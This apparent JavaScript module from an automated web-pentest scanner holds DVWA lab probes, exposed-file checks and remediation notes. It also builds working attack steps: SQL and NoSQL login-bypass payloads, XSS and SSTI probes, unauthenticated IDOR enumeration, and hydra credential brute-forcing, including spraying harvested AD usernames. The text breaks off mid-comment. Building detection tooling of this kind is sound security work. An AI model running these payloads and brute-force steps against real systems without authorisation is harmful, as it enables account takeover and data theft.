/**
 * Base de detección de superficie web (HackTricks → playbook / heurísticas).
 *
 * Qué sí: paths de laboratorio, cabeceras, errores de aplicación, cookies,
 * fingerprint. Cada clase apunta a la ficha de HackTricks para clasificar
 * el fallo y la defensa.
 *
 * Qué no: payloads, PoC, procedimientos de explotación ni recetas de ataque.
 * https://hacktricks.wiki/en/index.html
 */

export const HT = "https://hacktricks.wiki/en/pentesting-web/";
export const HT_INDEX = "https://hacktricks.wiki/en/index.html";

/** Techos RGPD (hechos legales, no una multa concreta). */
export const RGPD_SANCTION = {
  art834: {
    art: "Art. 83.4",
    es: "Hasta 10 M€ o el 2 % de la facturación anual global (obligaciones operativas: Arts. 28, 30, 32, 33–34). La AEPD puede sancionar el hueco sin que haya habido un ataque exitoso.",
    en: "Up to €10M or 2% of worldwide annual turnover (Arts. 28, 30, 32, 33–34). The DPA may sanction the gap without a successful attack.",
  },
  art835: {
    art: "Art. 83.5",
    es: "Hasta 20 M€ o el 4 % de la facturación anual global (principios del Art. 5, bases de licitud, derechos de los interesados). Se usa cuando el fallo toca confidencialidad/integridad de datos personales, no solo un procedimiento ausente.",
    en: "Up to €20M or 4% of worldwide annual turnover (Art. 5 principles). Used when personal-data confidentiality/integrity is at stake, not only a missing procedure.",
  },
};

/**
 * Módulos DVWA v1.10 — un GET autenticado por clase.
 * El índice /vulnerabilities/ ya lista los href; el GET por módulo
 * confirma HTTP 200 de esa superficie (no un 302 a login).
 */
export const DVWA_MODULES = [
  {
    id: "sqli_blind",
    path: "/vulnerabilities/sqli_blind/",
    stepId: "sqli-blind",
    probeDesc: "Superficie SQLi ciega (existencia del módulo)",
    title: "Módulo SQL Injection (Blind) DVWA accesible",
    severity: "High",
    cwe: "CWE-89",
    hacktricks: HT + "sql-injection/index.html",
    detect: ["SQL syntax", "mysql", "id="],
    description:
      "Endpoint /vulnerabilities/sqli_blind/: la entrada llega a SQL sin devolver filas (CWE-89). Misma clase que SQLi clásica. En lab basta el módulo autenticado; en producción hace falta evidencia de que la consulta se altera (errores SQL, booleanos). Parametrizar consultas.",
    remediation: "Prepared statements; mínimo privilegio en BD; no exponer el lab.",
  },
  {
    id: "sqli",
    path: "/vulnerabilities/sqli/",
    stepId: "sqli",
    probeDesc: "Superficie SQLi (existencia del módulo)",
    title: "Módulo SQL Injection (DVWA) accesible",
    severity: "High",
    cwe: "CWE-89",
    hacktricks: HT + "sql-injection/index.html",
    detect: ["You have an error in your SQL syntax", "mysql_fetch", "supplied argument is not a valid MySQL"],
    description:
      "Endpoint /vulnerabilities/sqli/: superficie deliberada de inyección SQL (CWE-89, OWASP A03). HackTricks: interferir con consultas de BD. Defensa: parametrizar, no concatenar SQL.",
    remediation: "Parametrizar consultas, WAF como capa extra, mínimo privilegio en BD.",
  },
  {
    id: "xss_s",
    path: "/vulnerabilities/xss_s/",
    stepId: "xss-s",
    probeDesc: "Superficie XSS almacenado (existencia del módulo)",
    title: "Módulo XSS (Stored) DVWA accesible",
    severity: "High",
    cwe: "CWE-79",
    hacktricks: HT + "xss-cross-site-scripting/index.html",
    detect: ["guestbook", "name=", "message="],
    description:
      "Endpoint /vulnerabilities/xss_s/: XSS persistente (CWE-79). El script se guarda y se sirve a otras sesiones. Encadena con cookies sin HttpOnly.",
    remediation: "Encoding contextual, CSP, HttpOnly.",
  },
  {
    id: "xss_d",
    path: "/vulnerabilities/xss_d/",
    stepId: "xss-d",
    probeDesc: "Superficie XSS DOM (existencia del módulo)",
    title: "Módulo XSS (DOM) DVWA accesible",
    severity: "High",
    cwe: "CWE-79",
    hacktricks: HT + "xss-cross-site-scripting/index.html",
    detect: ["location", "document.write", "innerHTML"],
    description:
      "Endpoint /vulnerabilities/xss_d/: XSS en el DOM (CWE-79). El script se arma en el navegador desde la URL. Defensa: no usar innerHTML con datos de URL.",
    remediation: "No usar innerHTML con datos de URL; CSP.",
  },
  {
    id: "xss_r",
    path: "/vulnerabilities/xss_r/",
    stepId: "xss-r",
    probeDesc: "Superficie XSS reflejado (existencia del módulo)",
    title: "Módulo XSS (Reflected) DVWA accesible",
    severity: "High",
    cwe: "CWE-79",
    hacktricks: HT + "xss-cross-site-scripting/index.html",
    detect: ["name=", "Hello"],
    description:
      "Endpoint /vulnerabilities/xss_r/: XSS reflejado (CWE-79). La entrada vuelve en el HTML de la misma respuesta.",
    remediation: "Codificar salida HTML, CSP, HttpOnly en cookies de sesión.",
  },
  {
    id: "exec",
    path: "/vulnerabilities/exec/",
    stepId: "exec",
    probeDesc: "Superficie command injection (existencia del módulo)",
    title: "Módulo Command Injection (DVWA) accesible",
    severity: "Critical",
    cwe: "CWE-78",
    hacktricks: HT + "command-injection/index.html",
    detect: ["ping", "ip=", "system(", "shell_exec"],
    description:
      "Endpoint /vulnerabilities/exec/: la entrada puede alcanzar una shell del SO (CWE-78). Impacto: ejecución en el host, no solo en la BD. Defensa: no interpolar input en system()/exec().",
    remediation: "No interpolar input en system()/exec(); APIs nativas; allow-list.",
  },
  {
    id: "fi",
    path: "/vulnerabilities/fi/",
    stepId: "fi",
    probeDesc: "Superficie file inclusion (existencia del módulo)",
    title: "Módulo File Inclusion (DVWA) accesible",
    severity: "High",
    cwe: "CWE-98",
    hacktricks: HT + "file-inclusion/index.html",
    detect: ["page=", "include", "allow_url_include"],
    description:
      "Endpoint /vulnerabilities/fi/: include/require con path controlable (CWE-98). LFI/RFI si allow_url_include está On.",
    remediation: "Allow-list de páginas; allow_url_include=Off; no pasar paths de usuario.",
  },
  {
    id: "upload",
    path: "/vulnerabilities/upload/",
    stepId: "upload",
    probeDesc: "Superficie file upload (existencia del módulo)",
    title: "Módulo File Upload (DVWA) accesible",
    severity: "High",
    cwe: "CWE-434",
    hacktricks: HT + "file-upload/index.html",
    detect: ["multipart/form-data", "type=\"file\"", "hackable/uploads"],
    description:
      "Endpoint /vulnerabilities/upload/: subida de ficheros. Si el servidor ejecuta lo subido, hay persistencia (CWE-434).",
    remediation: "Validar tipo en servidor; directorio sin ejecución; nombres aleatorios.",
  },
  {
    id: "csrf",
    path: "/vulnerabilities/csrf/",
    stepId: "csrf",
    probeDesc: "Superficie CSRF (existencia del módulo)",
    title: "Módulo CSRF (DVWA) accesible",
    severity: "High",
    cwe: "CWE-352",
    hacktricks: HT + "csrf-cross-site-request-forgery/index.html",
    detect: ["password_new", "password_conf", "Change"],
    description:
      "Endpoint /vulnerabilities/csrf/: peticiones de estado sin prueba de origen (CWE-352). Defensa: token anti-CSRF, SameSite, no GET para mutaciones.",
    remediation: "Token anti-CSRF en POST; SameSite; no GET para mutaciones.",
  },
  {
    id: "brute",
    path: "/vulnerabilities/brute/",
    stepId: "brute",
    probeDesc: "Superficie brute-force de login (existencia del módulo)",
    title: "Módulo Brute Force (DVWA) accesible",
    severity: "High",
    cwe: "CWE-307",
    hacktricks: HT_INDEX,
    detect: ["username", "password", "Login"],
    description:
      "Endpoint /vulnerabilities/brute/: login sin rate-limit/lockout evidentes (CWE-307).",
    remediation: "Rate limit, lockout, MFA, errores genéricos.",
  },
  {
    id: "weak_id",
    path: "/vulnerabilities/weak_id/",
    stepId: "weak-id",
    probeDesc: "Superficie IDs de sesión débiles (existencia del módulo)",
    title: "Módulo Weak Session IDs (DVWA) accesible",
    severity: "Medium",
    cwe: "CWE-330",
    hacktricks: HT + "hacking-with-cookies/index.html",
    detect: ["dvwaSession", "Set-Cookie"],
    description:
      "Endpoint /vulnerabilities/weak_id/: identificadores de sesión predecibles (CWE-330).",
    remediation: "CSPRNG, regenerar ID al login, flags HttpOnly/Secure/SameSite.",
  },
  {
    id: "captcha",
    path: "/vulnerabilities/captcha/",
    stepId: "captcha",
    probeDesc: "Superficie CAPTCHA inseguro (existencia del módulo)",
    title: "Módulo Insecure CAPTCHA (DVWA) accesible",
    severity: "Medium",
    cwe: "CWE-804",
    hacktricks: HT_INDEX,
    detect: ["captcha", "recaptcha"],
    description:
      "Endpoint /vulnerabilities/captcha/: CAPTCHA de laboratorio, a menudo verificable solo en cliente.",
    remediation: "Verificar CAPTCHA en servidor; rate limit adicional.",
  },
  {
    id: "csp",
    path: "/vulnerabilities/csp/",
    stepId: "csp",
    probeDesc: "Superficie CSP débil (existencia del módulo)",
    title: "Módulo CSP Bypass (DVWA) accesible",
    severity: "Medium",
    cwe: "CWE-693",
    hacktricks: HT + "content-security-policy-csp-bypass/index.html",
    detect: ["Content-Security-Policy", "unsafe-inline", "script-src"],
    description:
      "Endpoint /vulnerabilities/csp/: Content-Security-Policy débil o demostrablemente evadible (CWE-693).",
    remediation: "CSP con nonce/hash; sin unsafe-inline.",
  },
  {
    id: "javascript",
    path: "/vulnerabilities/javascript/",
    stepId: "js",
    probeDesc: "Superficie validación solo en cliente (existencia del módulo)",
    title: "Módulo JavaScript (DVWA) accesible",
    severity: "Medium",
    cwe: "CWE-602",
    hacktricks: HT_INDEX,
    detect: ["<script", "onsubmit"],
    description:
      "Endpoint /vulnerabilities/javascript/: controles solo en el cliente (CWE-602).",
    remediation: "Replicar validación en el backend.",
  },
];

/** Pasos extra de superficie (misconfig), no son módulos del menú DVWA.
 *  Siempre pedimos el cuerpo: un HTTP 200 de -w no basta para secretos (.bak)
 *  y el eje de curls colapsaba status-only vs GET del mismo path. */
export const DVWA_EXTRA_PROBES = [
  { stepId: "phpini", path: "/php.ini", desc: "php.ini en document root", statusOnly: false },
  { stepId: "config-bak", path: "/config/config.inc.php.bak", desc: "Backup de config.inc.php", statusOnly: false },
  { stepId: "config-dist", path: "/config/config.inc.php.dist", desc: "config.inc.php.dist", statusOnly: false },
];

/**
 * Sondas genéricas de exposición (cualquier stack, no solo DVWA).
 * Un HTTP 200 no basta: el heurístico exige `bodyRe` sobre el cuerpo real
 * (config de git, variables .env, JSON de swagger…) para confirmar el hallazgo.
 */
export const GENERIC_EXPOSURE_PROBES = [
  {
    stepId: "git-head",
    path: "/.git/HEAD",
    title: "Repositorio .git expuesto en el document root",
    severity: "Critical",
    cwe: "CWE-527",
    hacktricks: "https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/git.html",
    bodyRe: /ref:\s*refs\/heads\//i,
    description:
      "GET /.git/HEAD devuelve un puntero de rama válido: el repositorio Git (historial completo, commits borrados, posibles secretos) es reconstruible objeto a objeto sin autenticación.",
    remediation: "Retirar .git del document root en despliegue; denegar rutas ocultas a nivel de servidor web; rotar cualquier secreto que haya pasado por el historial.",
  },
  {
    stepId: "git-config",
    path: "/.git/config",
    title: "Configuración .git/config expuesta",
    severity: "Critical",
    cwe: "CWE-527",
    hacktricks: "https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/git.html",
    bodyRe: /\[core\]|\[remote\s+["']?origin/i,
    description: "GET /.git/config devuelve la configuración del repositorio (remoto origin, en ocasiones credenciales embebidas en la URL) y confirma que .git es navegable.",
    remediation: "Retirar .git del document root; nunca incluir credenciales en la URL del remoto.",
  },
  {
    stepId: "env-file",
    path: "/.env",
    title: "Archivo .env expuesto en el document root",
    severity: "Critical",
    cwe: "CWE-538",
    hacktricks: HT_INDEX,
    bodyRe: /APP_KEY=|DB_PASSWORD=|DATABASE_URL=|SECRET_KEY=|AWS_SECRET_ACCESS_KEY/i,
    description: "GET /.env devuelve variables de entorno de la aplicación: claves de framework, credenciales de base de datos y secretos de terceros en texto claro.",
    remediation: "Sacar .env del document root; denegarlo por configuración del servidor web; rotar de inmediato todos los secretos filtrados.",
  },
  {
    stepId: "htpasswd",
    path: "/.htpasswd",
    title: "Archivo .htpasswd expuesto",
    severity: "High",
    cwe: "CWE-538",
    hacktricks: HT_INDEX,
    bodyRe: /^[\w.-]+:\$?(apr1|2y|1)?\$/im,
    description: "GET /.htpasswd devuelve usuarios y hashes de autenticación básica, crackeables offline.",
    remediation: "Denegar acceso a archivos .ht* vía configuración del servidor; mover fuera del document root.",
  },
  {
    stepId: "swagger-json",
    path: "/swagger.json",
    title: "Definición Swagger/OpenAPI expuesta sin autenticación",
    severity: "Medium",
    cwe: "CWE-200",
    hacktricks: HT_INDEX,
    bodyRe: /"swagger"\s*:|"openapi"\s*:/i,
    description: "El documento Swagger/OpenAPI lista endpoints, parámetros y modelos completos de la API sin autenticación, ampliando la superficie de ataque conocida por el atacante.",
    remediation: "Restringir la documentación de API a red interna o autenticación; no publicarla en el entorno productivo.",
  },
  {
    stepId: "actuator-env",
    path: "/actuator/env",
    title: "Spring Boot Actuator /env expuesto",
    severity: "Critical",
    cwe: "CWE-200",
    hacktricks: HT_INDEX,
    bodyRe: /"activeProfiles"|"propertySources"/i,
    description: "El endpoint /actuator/env responde sin autenticación, filtrando variables de entorno, propiedades de Spring y a menudo credenciales de configuración.",
    remediation: "Deshabilitar actuator en producción o exigir autenticación/roles (management.endpoints.web.exposure).",
  },
  {
    stepId: "phpmyadmin",
    path: "/phpmyadmin/",
    title: "Panel phpMyAdmin accesible",
    severity: "Medium",
    cwe: "CWE-284",
    hacktricks: HT_INDEX,
    bodyRe: /phpMyAdmin/i,
    description: "phpMyAdmin es alcanzable sin restricción de red. Combinado con credenciales por defecto o débiles, es acceso directo a la base de datos.",
    remediation: "Restringir por IP/VPN; deshabilitar en producción; credenciales fuertes y 2FA si debe permanecer accesible.",
  },
  {
    stepId: "webconfig",
    path: "/web.config",
    title: "web.config expuesto (.NET)",
    severity: "High",
    cwe: "CWE-538",
    hacktricks: HT_INDEX,
    bodyRe: /<configuration>|connectionStrings/i,
    description: "web.config es servido por HTTP; puede contener connection strings y claves de máquina de aplicaciones .NET.",
    remediation: "Bloquear la extensión .config a nivel de IIS; mover secretos a un vault o variables de entorno.",
  },
];

/**
 * Listado de directorio real (autoindex Apache/nginx o serve-index de
 * Express/Node): confirma que una ruta es navegable, no solo que devolvió
 * HTTP 200 (una SPA devuelve 200+HTML de la app para cualquier ruta).
 */
export const DIRECTORY_LISTING_RE = /<title>\s*(index of|listing directory)|<h1>\s*index of/i;

/**
 * Superficie de apps REST/API modernas (Node/Express, Angular/React SPA,
 * microservicios) que el playbook original (pensado para PHP/DVWA) no
 * cubre: directorios estáticos mal cerrados, métricas de observabilidad y
 * source maps — nada de esto tiene relación con config.inc.php/php.ini.
 */
export const API_SURFACE_PROBES = [
  {
    stepId: "dir-ftp",
    path: "/ftp/",
    severity: "High",
    bodyRe: DIRECTORY_LISTING_RE,
    title: "Directorio /ftp/ listable sin autenticación",
    description:
      "GET /ftp/ devuelve un listado de directorio real (autoindex/serve-index): expone los nombres de archivo internos (documentos, backups, credenciales) sin autenticación. Cualquier archivo dentro es descargable directamente si el filtro de extensión no lo bloquea (CWE-548, CWE-200).",
    remediation: "Desactivar el listado de directorios en el servidor web; retirar del document root cualquier archivo que no deba ser público; no usar una carpeta estática para guardar documentos internos.",
  },
  {
    stepId: "dir-backup",
    path: "/backup/",
    severity: "High",
    bodyRe: DIRECTORY_LISTING_RE,
    title: "Directorio /backup/ listable sin autenticación",
    description:
      "GET /backup/ devuelve un listado de directorio real: es habitual que estas rutas contengan volcados de base de datos o copias de configuración con secretos (CWE-548, CWE-200).",
    remediation: "Desactivar el listado de directorios; mover backups fuera del document root y cifrarlos en reposo.",
  },
  {
    stepId: "dir-files",
    path: "/files/",
    severity: "Medium",
    bodyRe: DIRECTORY_LISTING_RE,
    title: "Directorio /files/ listable sin autenticación",
    description:
      "GET /files/ devuelve un listado de directorio real, exponiendo nombres de archivo internos que deberían enumerarse solo a través de la aplicación (CWE-548).",
    remediation: "Desactivar el listado de directorios en el servidor web; servir archivos solo a través de rutas de la aplicación con control de acceso.",
  },
  {
    stepId: "dir-uploads",
    path: "/uploads/",
    severity: "Medium",
    bodyRe: DIRECTORY_LISTING_RE,
    title: "Directorio /uploads/ listable sin autenticación",
    description:
      "GET /uploads/ devuelve un listado de directorio real. Si los usuarios suben documentos privados (no solo imágenes públicas), quedan enumerables por cualquiera (CWE-548).",
    remediation: "Desactivar el listado de directorios; servir subidas de usuario vía la aplicación con control de acceso, no como carpeta estática abierta.",
  },
  {
    stepId: "dir-storage",
    path: "/storage/",
    severity: "Medium",
    bodyRe: DIRECTORY_LISTING_RE,
    title: "Directorio /storage/ listable sin autenticación",
    description:
      "GET /storage/ devuelve un listado de directorio real, exponiendo la estructura interna de almacenamiento de la aplicación (CWE-548).",
    remediation: "Desactivar el listado de directorios en el servidor web; restringir /storage/ a la aplicación, no al navegador directo.",
  },
  {
    stepId: "metrics",
    path: "/metrics",
    severity: "Low",
    bodyRe: /^#\s*HELP\s|^#\s*TYPE\s/m,
    title: "Endpoint /metrics (Prometheus) expuesto sin autenticación",
    description:
      "El endpoint /metrics devuelve métricas en formato Prometheus (rutas internas, contadores de peticiones, tiempos de respuesta) sin autenticación, facilitando reconocimiento de topología y patrones de uso (CWE-200).",
    remediation: "Restringir /metrics a la red interna (scrape solo desde el Prometheus del entorno) o exigir autenticación; no exponerlo a Internet.",
  },
  {
    stepId: "sourcemap-main",
    path: "/main.js.map",
    severity: "Low",
    bodyRe: /"sourcesContent"|"sources"\s*:\s*\[/,
    title: "Source map de JavaScript expuesto (main.js.map)",
    description:
      "El source map del bundle principal es descargable, permitiendo reconstruir el código TypeScript/JavaScript original (nombres de variables, comentarios, lógica de negocio) sin ingeniería inversa del bundle minificado (CWE-540).",
    remediation: "No publicar archivos .map en el despliegue de producción; excluirlos del build o servirlos solo tras autenticación del equipo de desarrollo.",
  },
];

/** Pasos curl de sondas de superficie REST/API (directorios, métricas, source maps). */
export function apiSurfaceCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  return API_SURFACE_PROBES.map((p) =>
    step(`${prefix}-${p.stepId}`, "curl", ["-s", "-L", "--max-time", maxTime, baseUrl + p.path], null, {
      desc: `Sonda de superficie REST/API: ${p.path}`,
    }),
  );
}

/**
 * Bypass de autenticación por SQL injection en login — genérico (no solo
 * DVWA): intenta ' OR 1=1-- contra los formatos de login más comunes
 * (REST JSON tipo Juice Shop/Express, y form-urlencoded clásico). Un login
 * legítimo con este payload devuelve 401/"credenciales inválidas"; si la
 * consulta concatena el input en SQL, la condición siempre-verdadero
 * autentica sin contraseña real y el servidor emite un token de sesión.
 */
export const SQLI_LOGIN_PROBES = [
  {
    stepId: "rest-user-login",
    path: "/rest/user/login",
    contentType: "application/json",
    body: "{\"email\":\"' OR 1=1--\",\"password\":\"x\"}",
  },
  {
    stepId: "api-login",
    path: "/api/login",
    contentType: "application/json",
    body: "{\"username\":\"' OR 1=1--\",\"password\":\"x\"}",
  },
  {
    stepId: "login-form",
    path: "/login",
    contentType: "application/x-www-form-urlencoded",
    body: "username=' OR '1'='1'-- -&password=x",
  },
];

/** Pasos curl POST del bypass de login por SQL injection (fase 1, genérico). */
export function sqliLoginProbeSteps(step, prefix, baseUrl, maxTime = "12") {
  return SQLI_LOGIN_PROBES.map((p) =>
    step(`${prefix}-${p.stepId}`, "curl", [
      "-s", "-X", "POST", "--max-time", maxTime,
      "-H", `Content-Type: ${p.contentType}`,
      "-H", `X-DS-Playbook: ${prefix}-${p.stepId}`,
      "-d", p.body,
      baseUrl + p.path,
    ], null, {
      desc: `Sonda de bypass de login por SQL injection: ${p.path}`,
    }),
  );
}

/**
 * Bypass de autenticación por NoSQL injection en login — mismo principio que
 * SQLI_LOGIN_PROBES pero con operadores de MongoDB ($gt: "" es siempre
 * verdadero contra cualquier valor no vacío) en vez de sintaxis SQL. Apunta
 * a los mismos endpoints REST comunes: si el backend usa Mongo/Mongoose y
 * pasa el objeto del body directo al query sin sanear, el operador se
 * ejecuta como condición del filtro en vez de compararse como string.
 */
export const NOSQLI_LOGIN_PROBES = [
  {
    stepId: "rest-user-login",
    path: "/rest/user/login",
    contentType: "application/json",
    body: "{\"email\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
  },
  {
    stepId: "api-login",
    path: "/api/login",
    contentType: "application/json",
    body: "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
  },
];

/** Pasos curl POST del bypass de login por NoSQL injection (fase 1, genérico). */
export function nosqliLoginProbeSteps(step, prefix, baseUrl, maxTime = "12") {
  return NOSQLI_LOGIN_PROBES.map((p) =>
    step(`${prefix}-${p.stepId}`, "curl", [
      "-s", "-X", "POST", "--max-time", maxTime,
      "-H", `Content-Type: ${p.contentType}`,
      "-H", `X-DS-Playbook: ${prefix}-${p.stepId}`,
      "-d", p.body,
      baseUrl + p.path,
    ], null, {
      desc: `Sonda de bypass de login por NoSQL injection: ${p.path}`,
    }),
  );
}

/**
 * XSS reflejado genérico: un marcador único con caracteres que rompen HTML
 * (`<...>`) en parámetros de query habituales. Si vuelve SIN escapar en el
 * cuerpo, la app interpola la entrada en el HTML de respuesta sin
 * sanitizar — la explotabilidad real (contexto exacto, WAF, CSP) requiere
 * confirmación manual, pero el reflejo sin escapar ya es la señal que
 * importa detectar de forma automática.
 */
export const XSS_REFLECTION_MARKER = "dsxss1337";
export const XSS_REFLECTION_PAYLOAD = `<${XSS_REFLECTION_MARKER}>`;
export const XSS_REFLECTION_PARAMS = ["q", "search", "query", "name", "s"];

export function xssReflectionCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  return XSS_REFLECTION_PARAMS.map((param) =>
    step(`${prefix}-${param}`, "curl", [
      "-s", "-L", "--max-time", maxTime,
      "-G", "--data-urlencode", `${param}=${XSS_REFLECTION_PAYLOAD}`,
      baseUrl + "/",
    ], null, {
      desc: `Sonda de XSS reflejado genérico: parámetro ?${param}=`,
    }),
  );
}

/**
 * SSTI (Server-Side Template Injection) genérico: a diferencia de XSS
 * reflejado (busca el payload SIN escapar), aquí se busca que el motor de
 * plantillas lo haya EVALUADO. Un solo payload por parámetro concatena la
 * sintaxis de los motores más comunes — {{7*7}} (Jinja2/Twig/Nunjucks),
 * ${7*7} (Freemarker/Thymeleaf/JSP EL/OGNL), <%= 7*7 %> (ERB/JSP
 * scriptlet), @(7*7) (Razor), #{7*7} (Pug) — cada uno envuelto por el
 * mismo marcador único a ambos lados. Si CUALQUIERA de los motores evalúa
 * su expresión, el resultado ("49") queda pegado entre dos ocurrencias
 * consecutivas del marcador; los que no evalúan mantienen su sintaxis
 * literal entre marcadores. Por eso basta una sola regex
 * "MARCADOR + 49 + MARCADOR" para detectar evaluación en cualquier
 * posición, sin necesidad de un request por motor.
 */
export const SSTI_MARKER = "dsssti1337";
export const SSTI_PAYLOAD = `${SSTI_MARKER}{{7*7}}${SSTI_MARKER}\${7*7}${SSTI_MARKER}<%= 7*7 %>${SSTI_MARKER}@(7*7)${SSTI_MARKER}#{7*7}${SSTI_MARKER}`;
export const SSTI_PARAMS = ["q", "search", "query", "name", "s", "template", "lang"];

const SSTI_EVALUATED_RE = new RegExp(`${SSTI_MARKER}\\s*49\\s*${SSTI_MARKER}`);

/** true si algún motor de plantillas evaluó su expresión (ver comentario arriba). */
export function sstiEvaluated(text) {
  return SSTI_EVALUATED_RE.test(String(text || ""));
}

export function sstiReflectionCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  return SSTI_PARAMS.map((param) =>
    step(`${prefix}-${param}`, "curl", [
      "-s", "-L", "--max-time", maxTime,
      "-G", "--data-urlencode", `${param}=${SSTI_PAYLOAD}`,
      baseUrl + "/",
    ], null, {
      desc: `Sonda de SSTI genérico: parámetro ?${param}=`,
    }),
  );
}

/**
 * Open redirect genérico: parámetros habituales de redirección con una URL
 * externa de prueba. Si el servidor responde con Location apuntando a esa
 * URL (sin validar contra allow-list), es redirect abierto — útil para
 * phishing y para blanquear enlaces maliciosos con el dominio de confianza.
 */
export const OPEN_REDIRECT_TEST_URL = "https://ds-redirect-probe.invalid/";
export const OPEN_REDIRECT_PARAMS = ["redirect", "redirect_uri", "url", "next", "return", "returnUrl", "continue", "dest", "to"];
// "/redirect" además de la raíz: convención muy habitual (tracking de
// salida a enlaces externos, p. ej. Juice Shop) para un endpoint dedicado
// en vez de un parámetro cualquiera en cualquier ruta.
export const OPEN_REDIRECT_PATHS = ["/", "/redirect"];

export function openRedirectCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  const steps = [];
  for (const path of OPEN_REDIRECT_PATHS) {
    for (const param of OPEN_REDIRECT_PARAMS) {
      const pathTag = path === "/" ? "root" : path.replace(/\//g, "");
      steps.push(step(`${prefix}-${pathTag}-${param}`, "curl", [
        "-s", "-I", "--max-time", maxTime,
        "-G", "--data-urlencode", `${param}=${OPEN_REDIRECT_TEST_URL}`,
        baseUrl + path,
      ], null, {
        desc: `Sonda de open redirect: ${path}?${param}=`,
      }));
    }
  }
  return steps;
}

/**
 * IDOR genérico: rutas de recurso por ID numérico que siguen convenciones
 * REST comunes (users/1, orders/1, basket/1…). Sin sesión ni cookie: si
 * devuelven HTTP 200 con datos de aspecto real (email, username, precio,
 * productos) en vez de un 401/403/404, el endpoint expone objetos ajenos
 * sin verificar que el llamante tenga permiso sobre ESE id (CWE-639).
 * No cubre todos los casos (haría falta una sesión real para IDOR
 * horizontal entre dos usuarios distintos); esto detecta el caso más
 * grave: acceso SIN NINGUNA sesión.
 */
export const IDOR_PROBES = [
  { stepId: "api-users-1", path: "/api/users/1" },
  { stepId: "api-user-1", path: "/api/user/1" },
  { stepId: "rest-user-1", path: "/rest/user/1" },
  { stepId: "api-orders-1", path: "/api/orders/1" },
  { stepId: "api-order-1", path: "/api/order/1" },
  { stepId: "api-accounts-1", path: "/api/accounts/1" },
  { stepId: "api-profile-1", path: "/api/profile/1" },
  { stepId: "rest-basket-1", path: "/rest/basket/1" },
];
export const IDOR_DATA_MARKER_RE = /"email"\s*:|"username"\s*:|"passwordhash"\s*:|"totalprice"\s*:|"products"\s*:\s*\[/i;
export const IDOR_DENIED_RE = /unauthorized|not authenticated|"message"\s*:\s*"jwt|forbidden|cast to objectid failed|not found/i;

export function idorCurlSteps(step, prefix, baseUrl, maxTime = "12") {
  return IDOR_PROBES.map((p) =>
    step(`${prefix}-${p.stepId}`, "curl", [
      "-s", "-L", "--max-time", maxTime, "-w", "\nDS_HTTP:%{http_code}\n",
      baseUrl + p.path,
    ], null, {
      desc: `Sonda de IDOR: ${p.path} sin autenticación`,
    }),
  );
}

/**
 * Credenciales por defecto contra endpoints de login REST/JSON conocidos,
 * vía hydra (módulo http-post-form) con diccionarios curados y pequeños
 * (SecLists top-usernames-shortlist × top-passwords-shortlist), no un
 * dump de contraseñas filtradas: la pregunta no es "¿qué contraseña real
 * usa esta persona?" (eso es rockyou.txt, offline, contra un hash), sino
 * "¿sigue en un usuario/contraseña de fábrica evidente?". Detecta éxito
 * por la misma señal que SQLI/NOSQLI_LOGIN_PROBES (JWT en la respuesta),
 * no por adivinar un string de "login incorrecto" que varía por app.
 * Solo corre en fase 3 (hydra está en PHASE_TOOLS[3] en bridge.py).
 */
export const HYDRA_USERLIST = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt";
export const HYDRA_PASSLIST = "/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt";
export const DEFAULT_CREDS_LOGIN_PROBES = [
  {
    stepId: "rest-user-login",
    path: "/rest/user/login",
    // Los ":" del JSON deben escaparse para el parser de hydra (":" separa
    // sus propios campos); "\:" es literal para hydra, no para el shell:
    // este array llega a subprocess sin shell, cada elemento es un argv.
    bodyTemplate: "{\"email\"\\:\"^USER^\",\"password\"\\:\"^PASS^\"}",
  },
  {
    stepId: "api-login",
    path: "/api/login",
    bodyTemplate: "{\"username\"\\:\"^USER^\",\"password\"\\:\"^PASS^\"}",
  },
];

function hydraTarget(baseUrl) {
  try {
    const u = new URL(baseUrl);
    return { host: u.hostname, port: u.port || (u.protocol === "https:" ? "443" : "80") };
  } catch {
    return { host: baseUrl, port: "80" };
  }
}

/** Pasos hydra de credenciales por defecto contra endpoints de login JSON (fase 3). */
export function hydraDefCredsSteps(step, prefix, baseUrl) {
  const { host, port } = hydraTarget(baseUrl);
  return DEFAULT_CREDS_LOGIN_PROBES.map((p) => {
    const misc = `${p.path}:${p.bodyTemplate}:G=1:H=Content-Type\\: application/json:S=eyJ`;
    return step(`${prefix}-${p.stepId}`, "hydra", [
      "-L", HYDRA_USERLIST,
      "-P", HYDRA_PASSLIST,
      "-f", "-t", "16",
      "-s", port,
      host,
      "http-post-form",
      misc,
    ], null, {
      desc: `Credenciales por defecto (diccionario) contra ${p.path}`,
    });
  });
}

/**
 * Cruce AD → web: usuarios reales que salieron de netexec/GetNPUsers/
 * lookupsid/samrdump (no un diccionario genérico) probados contra el mismo
 * login web que hydraDefCredsSteps ya ataca — útil cuando el DC también
 * sirve ADFS/OWA/una app propia en el mismo host. `-l` (usuario único),
 * no `-L` (fichero): la identidad ya la confirmó otra sonda, no se adivina.
 * Tope 3 usuarios × probes de login existentes, para no explotar el conteo
 * de pasos.
 */
export function hydraAdUserSteps(step, prefix, baseUrl, users) {
  const { host, port } = hydraTarget(baseUrl);
  const list = Array.isArray(users) ? users.slice(0, 3) : [];
  const out = [];
  list.forEach((user, i) => {
    DEFAULT_CREDS_LOGIN_PROBES.forEach((p) => {
      const misc = `${p.path}:${p.bodyTemplate}:G=1:H=Content-Type\\: application/json:S=eyJ`;
      out.push(step(`${prefix}-${p.stepId}-aduser-${i + 1}`, "hydra", [
        "-l", user,
        "-P", HYDRA_PASSLIST,
        "-f", "-t", "16",
        "-s", port,
        host,
        "http-post-form",
        misc,
      ], null, {
        desc: `Usuario AD real «${user}» (hallado en collection) contra ${p.path}`,
      }));
    });
  });
  return out;
}

/** Línea de éxito de hydra: "[http-post-form] ... login: X   password: Y". */
export const HYDRA_SUCCESS_RE = /\[http-post-form\][^\n]*login:\s*(\S+)\s+password:\s*(\S+)/i;

/**
 * Cabeceras y cookies de seguridad — genérico, cualquier stack. Ausencias
 * habituales que un pentester manual siempre revisa a mano: HSTS, nosniff,
